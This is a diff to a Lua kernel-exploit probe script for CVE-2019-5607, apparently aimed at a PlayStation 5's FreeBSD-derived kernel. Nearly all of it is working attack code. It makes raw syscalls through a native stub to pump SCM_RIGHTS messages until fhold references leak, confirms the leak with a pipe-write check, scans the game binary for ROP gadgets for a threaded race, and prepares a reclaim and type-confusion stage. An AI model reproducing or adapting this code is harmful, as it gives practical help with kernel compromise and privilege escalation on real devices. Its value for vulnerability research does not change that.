@@ -26,7 +26,10 @@
 --   C — Threaded fd table race (concurrent fhold pump + close)
 --   D — Reclaim and type confusion scan
 
+local TEST_SECTION = "A"
+
 print("=== PROBE 89a: CVE-2019-5607 FD REFCOUNT RACE ===")
+print("Section: " .. TEST_SECTION)
 print("")
 
 -- ============================================================
@@ -133,7 +136,7 @@ local function scm_send(sock_fd, fd_to_pass)
     wd(msg + 0x18, 1)
     wq(msg + 0x20, uint64(to_num(cmsg)))
     wd(msg + 0x28, 24)     -- controllen = CMSG_SPACE(4) = 24
-    return to_num(native.fcall_with_rax(stub, 28, sock_fd, to_num(msg), 0))
+    return to_num(native.fcall_with_rax(stub, 28, sock_fd, to_num(msg), 0x20080))
 end
 
 local function scm_recv(sock_fd)
@@ -141,20 +144,31 @@ local function scm_recv(sock_fd)
     local recv_iov = memory.alloc(16)
     wq(recv_iov, uint64(to_num(recv_buf)))
     wq(recv_iov + 8, uint64(1))
-    local recv_cmsg = memory.alloc(64)
-    zero(recv_cmsg, 64)
+    local recv_cmsg = memory.alloc(128)
+    zero(recv_cmsg, 128)
     local recv_msg = memory.alloc(64)
     zero(recv_msg, 64)
     wq(recv_msg + 0x10, uint64(to_num(recv_iov)))
     wd(recv_msg + 0x18, 1)
     wq(recv_msg + 0x20, uint64(to_num(recv_cmsg)))
-    wd(recv_msg + 0x28, 64)
-    local rr = to_num(native.fcall_with_rax(stub, 27, sock_fd, to_num(recv_msg), 0))
+    wd(recv_msg + 0x28, 128)
+    local rr = to_num(native.fcall_with_rax(stub, 27, sock_fd, to_num(recv_msg), 0x80))
     if rr <= 0 then return -1, "recv failed rv=" .. rr end
-    local ctyp = to_num(memory.read_dword(recv_cmsg + 8))
-    local fd = to_num(memory.read_dword(recv_cmsg + 16))
-    if ctyp == 1 and fd > 0 and fd < 10000 then return fd, "ok" end
-    return -1, string.format("ctyp=%d fd@16=%d", ctyp, fd)
+    local off = 0
+    while off < 112 do
+        local clen = rd(recv_cmsg + off) or 0
+        if clen < 12 then break end
+        local ctype = rd(recv_cmsg + off + 8) or 0
+        if ctype == 1 then
+            local fd_val = rd(recv_cmsg + off + 16) or 0
+            if fd_val > 0 and fd_val < 10000 then return fd_val, "ok" end
+            return -1, string.format("SCM_RIGHTS fd=%d", fd_val)
+        end
+        local aligned = math.floor((clen + 7) / 8) * 8
+        if aligned == 0 then break end
+        off = off + aligned
+    end
+    return -1, "no SCM_RIGHTS cmsg"
 end
 
 -- Send SCM_RIGHTS but do NOT recv — leaves the fd in the socket buffer.
@@ -188,15 +202,9 @@ end
 -- ============================================================
 -- SECTION A: SCM_RIGHTS error path trigger
 -- ============================================================
-print("--- SECTION A: SCM_RIGHTS error path trigger ---")
+if TEST_SECTION == "A" or TEST_SECTION == "ALL" then
+print("--- SECTION A: SCM_RIGHTS gate + error path ---")
 print("")
-
--- Strategy: fill the receive buffer so sendmsg fails AFTER fhold
--- 1. Create socketpair
--- 2. Set SO_RCVBUF to minimum on receiver
--- 3. Fill the buffer with regular data
--- 4. Then sendmsg with SCM_RIGHTS — if send succeeds, fhold ran;
---    if buffer was full, the *delivery* fails but fhold already happened
 
 local sv = memory.alloc(8)
 wq(sv, uint64(0))
@@ -206,112 +214,186 @@ local pr = rd(sv + 4)
 print("  socketpair ret=" .. sp .. " fds=[" .. (ps or "?") .. "," .. (pr or "?") .. "]")
 
 if sp ~= 0 then
-    print("  FAIL: socketpair failed, cannot test SCM_RIGHTS")
-    print("=== SECTION A ABORTED ===")
+    print("  FAIL: socketpair")
 else
-    -- Set receiver non-blocking
+    native.fcall_with_rax(stub, 92, ps, F_SETFL, O_NONBLOCK)
     native.fcall_with_rax(stub, 92, pr, F_SETFL, O_NONBLOCK)
 
-    -- Try to set SO_RCVBUF to minimum (1 byte)
-    local optval = memory.alloc(4)
-    wd(optval, 1)
-    local sopt_ret = to_num(native.fcall_with_rax(stub, 105, pr, 0xFFFF, 0x1002, to_num(optval), 4))
-    print("  setsockopt(SO_RCVBUF=1) ret=" .. sopt_ret)
-
-    -- Read back actual SO_RCVBUF
-    local optlen = memory.alloc(4)
-    wd(optlen, 4)
-    wd(optval, 0)
-    native.fcall_with_rax(stub, 118, pr, 0xFFFF, 0x1002, to_num(optval), to_num(optlen))
-    local actual_rcvbuf = rd(optval) or 0
-    print("  actual SO_RCVBUF=" .. actual_rcvbuf)
-
-    -- Create a target fd to pass
     local target_p1, target_p2 = create_pipe()
     local target_fd = to_num(target_p1)
     local target_wr = to_num(target_p2)
-    print("  target pipe fd=" .. target_fd)
+    print("  target fd=" .. target_fd)
 
-    -- Fill receiver buffer
-    local fill_buf = memory.alloc(1024)
-    for i = 0, 1020, 4 do wd(fill_buf + i, 0x41414141) end
-    local fill_total = 0
-    local fill_count = 0
-    for i = 1, 200 do
-        local n = to_num(native.fcall_with_rax(stub, 4, ps, to_num(fill_buf), 1024))
-        if n <= 0 then break end
-        fill_total = fill_total + n
-        fill_count = fill_count + 1
-    end
-    print("  filled rcvbuf: " .. fill_total .. " bytes in " .. fill_count .. " writes")
+    -- STEP 1: Gate test — basic SCM_RIGHTS on clean buffer
+    local gate_ret = scm_send(ps, target_fd)
+    print("  [1] gate send ret=" .. gate_ret)
 
-    -- Now attempt SCM_RIGHTS send — should fail (EAGAIN/ENOBUFS) AFTER fhold
-    local scm_ret = scm_send(ps, target_fd)
-    print("  scm_send(target_fd=" .. target_fd .. ") ret=" .. scm_ret)
-
-    if scm_ret > 0 then
-        print("  send SUCCEEDED despite full buffer — fhold definitely ran")
-        print("  (fd was interned into socket buffer, refcount incremented)")
-    elseif scm_ret == -1 then
-        print("  send FAILED (buffer full) — checking if fhold ran anyway...")
-        -- The question: did internalize_fp run (fhold) before the buffer-full check?
-        -- In FreeBSD 11, the order is: validate cmsg → fhold each fd → try delivery
-        -- If delivery fails after fhold, the refs leak
+    local need_lc = false
+    if gate_ret <= 0 then
+        print("  gate FAILED, trying LOCAL_CREDS...")
+        local lc = memory.alloc(4); wd(lc, 1)
+        local r1 = to_num(native.fcall_with_rax(stub, 105, ps, 0, 2, to_num(lc), 4))
+        local r2 = to_num(native.fcall_with_rax(stub, 105, pr, 0, 2, to_num(lc), 4))
+        print("  LOCAL_CREDS sender=" .. r1 .. " receiver=" .. r2)
+        gate_ret = scm_send(ps, target_fd)
+        print("  gate send (LC) ret=" .. gate_ret)
+        if gate_ret > 0 then need_lc = true end
     end
 
-    -- fstat the target fd — should still work regardless
-    local sb = memory.alloc(0x100)
-    zero(sb, 0x100)
-    local fstat_ret = to_num(native.fcall_with_rax(stub, 189, target_fd, to_num(sb)))
-    local ino = to_num(rq(sb + 8) or uint64(0))
-    print(string.format("  fstat(target_fd=%d) ret=%d ino=0x%X", target_fd, fstat_ret, ino))
-
-    -- Drain and try again with a clear buffer
-    print("")
-    print("  --- clear buffer test ---")
-    -- Drain receiver
-    local drain_buf = memory.alloc(8192)
-    for i = 1, 100 do
-        local n = to_num(native.fcall_with_rax(stub, 3, pr, to_num(drain_buf), 8192))
-        if n <= 0 then break end
-    end
-
-    -- Now send SCM_RIGHTS on clean buffer — should succeed
-    local scm_ret2 = scm_send(ps, target_fd)
-    print("  scm_send (clean buffer) ret=" .. scm_ret2)
-
-    if scm_ret2 > 0 then
-        -- Receive to verify fd passing works
-        local recv_fd, recv_info = scm_recv(pr)
-        print("  scm_recv → fd=" .. recv_fd .. " (" .. recv_info .. ")")
-
-        if recv_fd > 0 then
-            -- Verify it's the same pipe
-            local sb2 = memory.alloc(0x100)
-            zero(sb2, 0x100)
-            native.fcall_with_rax(stub, 189, recv_fd, to_num(sb2))
-            local ino2 = to_num(rq(sb2 + 8) or uint64(0))
-            print(string.format("  fstat(recv_fd=%d) ino=0x%X (orig=0x%X) %s",
-                recv_fd, ino2, ino, ino2 == ino and "SAME" or "DIFFERENT"))
-            native.fcall_with_rax(stub, 6, recv_fd)
-            print("  *** SCM_RIGHTS fd passing CONFIRMED working ***")
-        end
+    if gate_ret <= 0 then
+        print("  *** SCM_RIGHTS BLOCKED — cannot test CVE ***")
     else
-        print("  SCM_RIGHTS send FAILED even on clean buffer — sandbox may block it")
+        local rfd, ri = scm_recv(pr)
+        print("  gate recv fd=" .. rfd .. " (" .. ri .. ")")
+        if rfd > 0 then native.fcall_with_rax(stub, 6, rfd) end
+
+        local sb = memory.alloc(0x100)
+        zero(sb, 0x100)
+        native.fcall_with_rax(stub, 189, target_fd, to_num(sb))
+        local ino = to_num(rq(sb + 8) or uint64(0))
+        print(string.format("  *** GATE PASSED%s ino=0x%X ***",
+            need_lc and " (LOCAL_CREDS)" or "", ino))
+
+        -- STEP 2: Broken-pipe error path (CVE-2019-5607 trigger)
+        -- Close receiver → sendmsg fails AFTER fhold → refs leak
+        print("")
+        print("  [2] broken-pipe error path")
+        native.fcall_with_rax(stub, 6, ps)
+        native.fcall_with_rax(stub, 6, pr)
+
+        local c624 = make_syscall(624)
+        local vm0 = to_num(c624(uint64(0), uint64(0), uint64(0)))
+
+        wq(sv, uint64(0))
+        local ep = to_num(native.fcall_with_rax(stub, 135, 1, 1, 0, to_num(sv)))
+        local es = rd(sv); local er = rd(sv + 4)
+        native.fcall_with_rax(stub, 92, es, F_SETFL, O_NONBLOCK)
+        if need_lc then
+            local lc = memory.alloc(4); wd(lc, 1)
+            native.fcall_with_rax(stub, 105, es, 0, 2, to_num(lc), 4)
+        end
+
+        native.fcall_with_rax(stub, 6, er)
+        print("  closed receiver, pumping on broken pipe...")
+
+        local ok_cnt, fail_cnt = 0, 0
+        for i = 1, 500 do
+            local r = scm_send(es, target_fd)
+            if r > 0 then ok_cnt = ok_cnt + 1 else fail_cnt = fail_cnt + 1 end
+        end
+        print("  500 sends: ok=" .. ok_cnt .. " fail=" .. fail_cnt)
+
+        local vm1 = to_num(c624(uint64(0), uint64(0), uint64(0)))
+        print("  VM: " .. vm0 .. " → " .. vm1 .. " d=" .. (vm1 - vm0))
+        native.fcall_with_rax(stub, 6, es)
+
+        -- STEP 3: Buffer-full error path via SCM_RIGHTS pump
+        -- scm_send uses MSG_DONTWAIT|MSG_NOSIGNAL (0x20080)
+        -- Pump SCM_RIGHTS until buffer fills → sends fail after fhold
+        print("")
+        print("  [3] buffer-full SCM_RIGHTS pump")
+
+        wq(sv, uint64(0))
+        local bp = to_num(native.fcall_with_rax(stub, 135, 1, 1, 0, to_num(sv)))
+        local bs = rd(sv); local br = rd(sv + 4)
+        if need_lc then
+            local lc = memory.alloc(4); wd(lc, 1)
+            native.fcall_with_rax(stub, 105, bs, 0, 2, to_num(lc), 4)
+        end
+
+        local ov = memory.alloc(4); wd(ov, 1)
+        to_num(native.fcall_with_rax(stub, 105, br, 0xFFFF, 0x1002, to_num(ov), 4))
+        local ol = memory.alloc(4); wd(ol, 4); wd(ov, 0)
+        native.fcall_with_rax(stub, 118, br, 0xFFFF, 0x1002, to_num(ov), to_num(ol))
+        print("  SO_RCVBUF=" .. (rd(ov) or 0))
+
+        local vm2 = to_num(c624(uint64(0), uint64(0), uint64(0)))
+        ok_cnt, fail_cnt = 0, 0
+        local first_fail = 0
+        for i = 1, 2000 do
+            local r = scm_send(bs, target_fd)
+            if r > 0 then
+                ok_cnt = ok_cnt + 1
+            else
+                fail_cnt = fail_cnt + 1
+                if first_fail == 0 then first_fail = i end
+                if fail_cnt >= 50 then break end
+            end
+        end
+        print("  pump: ok=" .. ok_cnt .. " fail=" .. fail_cnt ..
+            " first_fail_at=" .. first_fail)
+
+        local vm3 = to_num(c624(uint64(0), uint64(0), uint64(0)))
+        print("  VM: " .. vm2 .. " → " .. vm3 .. " d=" .. (vm3 - vm2))
+
+        if fail_cnt > 0 then
+            print("  *** " .. fail_cnt .. " sends failed after fhold (CVE trigger?) ***")
+            print("  fhold refs leaked = " .. fail_cnt .. " (if CVE present)")
+        end
+
+        -- Drain held fds and count
+        local drained = 0
+        for i = 1, ok_cnt + 100 do
+            local fd, _ = scm_recv(br)
+            if fd > 0 then
+                native.fcall_with_rax(stub, 6, fd)
+                drained = drained + 1
+            else
+                break
+            end
+        end
+        print("  drained " .. drained .. " fds (sent " .. ok_cnt .. ")")
+
+        native.fcall_with_rax(stub, 6, bs)
+        native.fcall_with_rax(stub, 6, br)
+
+        -- LEAK VERIFICATION: close target_fd, then write to pipe
+        -- If fhold leaked: f_count = 1 + 50 leaked = 51
+        --   close(target_fd) → f_count=50 → NOT zero → pipe alive → write OK
+        -- If patched: f_count = 1
+        --   close(target_fd) → f_count=0 → pipe destroyed → write = -1 (EPIPE)
+        print("")
+        print("  [4] LEAK VERIFICATION")
+
+        -- Block SIGPIPE so write() on broken pipe returns -1 instead of killing
+        local sa = memory.alloc(32); zero(sa, 32)
+        wq(sa, uint64(1))  -- sa_handler = SIG_IGN
+        local sig_rv = to_num(native.fcall_with_rax(stub, 416, 13, to_num(sa), 0))
+        print("  sigaction(SIGPIPE,SIG_IGN)=" .. sig_rv)
+
+        print("  closing target_fd=" .. target_fd)
+        native.fcall_with_rax(stub, 6, target_fd)
+        target_fd = -1
+
+        local test_byte = memory.alloc(4); wd(test_byte, 0x42)
+        local wr_rv = to_num(native.fcall_with_rax(stub, 4, target_wr, to_num(test_byte), 1))
+        print("  write(pipe_wr) after close(pipe_rd) = " .. wr_rv)
+        if wr_rv > 0 then
+            print("  *** CVE-2019-5607 CONFIRMED: fhold refs leaked, pipe still alive ***")
+            print("  leaked refs = " .. fail_cnt)
+        elseif wr_rv == 0 then
+            print("  write returned 0 — ambiguous")
+        else
+            print("  write returned " .. wr_rv .. " — pipe destroyed, CVE PATCHED")
+        end
+        native.fcall_with_rax(stub, 6, target_wr)
+        target_wr = -1
     end
 
-    native.fcall_with_rax(stub, 6, target_fd)
-    native.fcall_with_rax(stub, 6, target_wr)
-    native.fcall_with_rax(stub, 6, ps)
-    native.fcall_with_rax(stub, 6, pr)
+    if target_fd > 0 then native.fcall_with_rax(stub, 6, target_fd) end
+    if target_wr > 0 then native.fcall_with_rax(stub, 6, target_wr) end
 end
 
 if not canary() then print("*** CANARY DEAD after section A ***"); return end
+print("[A-DONE]")
+end -- section A
+
 print("")
 
 -- ============================================================
 -- SECTION B: Refcount leak verification
 -- ============================================================
+if TEST_SECTION == "B" or TEST_SECTION == "ALL" then
 print("--- SECTION B: Refcount leak verification ---")
 print("")
 
@@ -320,10 +402,11 @@ print("")
 -- Then close the fd — if refcount > 1, close decrements but doesn't free.
 -- fstat after close: if it works, refcount was leaked.
 
+local sv = memory.alloc(8)
 wq(sv, uint64(0))
-sp = to_num(native.fcall_with_rax(stub, 135, 1, 1, 0, to_num(sv)))
-ps = rd(sv)
-pr = rd(sv + 4)
+local sp = to_num(native.fcall_with_rax(stub, 135, 1, 1, 0, to_num(sv)))
+local ps = rd(sv)
+local pr = rd(sv + 4)
 print("  socketpair fds=[" .. (ps or "?") .. "," .. (pr or "?") .. "]")
 
 if sp ~= 0 then
@@ -441,11 +524,15 @@ else
 end
 
 if not canary() then print("*** CANARY DEAD after section B ***"); return end
+print("[B-DONE]")
+end -- section B
+
 print("")
 
 -- ============================================================
 -- SECTION C: Threaded fd table race
 -- ============================================================
+if TEST_SECTION == "C" or TEST_SECTION == "ALL" then
 print("--- SECTION C: Threaded SCM_RIGHTS pump (thr_create) ---")
 print("")
 
@@ -497,16 +584,16 @@ local function find_gadget(base, bytes, limit)
     return nil
 end
 
-local jmp_self = find_gadget(eboot_base, {0xEB, 0xFE}, 0x100000)
+local jmp_self = find_gadget(eboot_base, {0xEB, 0xFE}, 0x10000)
 if not jmp_self then
     print("  no jmp $ gadget found; skipping section C")
 else
     print("  jmp $ at " .. q(jmp_self))
 
     -- Also find a `ret` gadget (C3) for syscall chains
-    local ret_gadget = find_gadget(eboot_base, {0xC3, 0xCC}, 0x100000) -- ret; int3
+    local ret_gadget = find_gadget(eboot_base, {0xC3, 0xCC}, 0x10000) -- ret; int3
     if not ret_gadget then
-        ret_gadget = find_gadget(eboot_base, {0xC3, 0x90}, 0x100000) -- ret; nop
+        ret_gadget = find_gadget(eboot_base, {0xC3, 0x90}, 0x10000) -- ret; nop
     end
     if ret_gadget then
         print("  ret gadget at " .. q(ret_gadget))
@@ -621,8 +708,9 @@ else
             print("  close() would decrement by 1; " .. pump_ok .. " refs would remain leaked")
         end
 
-        -- Kill the spin thread
-        pcall(function() sc_thr_kill(child_tid, uint64(9)) end) -- SIGKILL
+        -- NOTE: thr_kill(tid, 9) kills the entire process on PS5, not just the thread.
+        -- Leave the spin thread running; it dies when the connection closes.
+        -- pcall(function() sc_thr_kill(child_tid, uint64(9)) end)
         sleep_ms(100)
     end
 
@@ -643,11 +731,15 @@ else
 end
 
 if not canary() then print("*** CANARY DEAD after section C ***"); return end
+print("[C-DONE]")
+end -- section C
+
 print("")
 
 -- ============================================================
 -- SECTION D: Reclaim and type confusion scan
 -- ============================================================
+if TEST_SECTION == "D" or TEST_SECTION == "ALL" then
 print("--- SECTION D: Reclaim after refcount leak ---")
 print("")
 
@@ -788,6 +880,9 @@ else
     native.fcall_with_rax(stub, 6, ps)
     native.fcall_with_rax(stub, 6, pr)
 end
+
+print("[D-DONE]")
+end -- section D
 
 print("")
 print("canary: " .. (canary() and "ALIVE" or "DEAD"))
